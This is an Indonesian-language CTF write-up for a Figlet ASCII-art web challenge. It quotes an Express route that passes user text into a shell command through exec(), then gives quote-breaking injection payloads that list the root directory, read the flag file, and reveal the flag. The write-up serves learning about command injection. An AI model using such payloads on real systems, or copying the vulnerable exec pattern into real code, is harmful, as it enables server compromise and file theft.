# **FIGLET**
Figlet adalah sebuah program komputer yang digunakan untuk menghasilkan teks berukuran besar dalam gaya seni ASCII. Nama "Figlet" sendiri merupakan kependekan dari "Frank, Ian, and Glenn's LETters". Program ini dibuat oleh sekelompok programmer pada tahun 1991 dan telah menjadi populer di kalangan komunitas pengguna Unix dan Linux.
Figlet dapat mengubah teks biasa menjadi teks berukuran besar dengan berbagai gaya huruf yang kreatif, seperti huruf-huruf berkontur, huruf-huruf berbayang, huruf-huruf yang terdiri dari karakter-karakter kecil, dan banyak lagi. Program ini menawarkan berbagai pilihan gaya huruf yang bisa dipilih sesuai dengan preferensi pengguna.

Gambar Logo 
## **About the challenge**
Pada challenge kali ini, probleset membuatkan sebuah website untuk temannya yang menyukai seni ASCII. Web tersebut setelah dianalisis memiliki vulnerability pada inputannya.

Gambar logo
## **Solution**
- Buka App.js yang diberikan oleh probleset dan analisis code tersebut.
- Pada kode yang diberikan, terdapat potensi kerentanan terkait dengan Command Injection. Potensi kerentanan ini terdapat pada bagian code berikut:
```javascript
app.post('/figlet', (req, res) => {
    let cmd = 'timeout 1 figlet \'' + req.body.text + '\'';
    exec(cmd, (err, stdout, stderr) => {
        if (err) {
            console.log(stderr);
            res.send('Error');
        } else {
            res.send(stdout);
        }
    });
});
```
Disini saya dapat mengirimkan teks yang mengandung karakter khusus seperti tanda petik tunggal (') atau karakter pemisah perintah (seperti ; atau &&) yang dapat mengubah arti perintah yang dieksekusi. Contohnya seperti ini :
```
hello';ls /;echo '1
```
Output dari teks yang saya masukkan diwebsite tersebut seperti ini :

Image

Dapat dilihat flag nya dengan format[kodeacak].txt, saya bisa read flag tersebut dengan kode dibawah ini :
```
hello';cat /flag-3eb436c4-1dd2-4e01-b1f9-af7c2af01481.txt;echo '1
```
And we got flag
```
ForestyHC{w0w_u_can_hack_figl33t_7d7c1b}
```
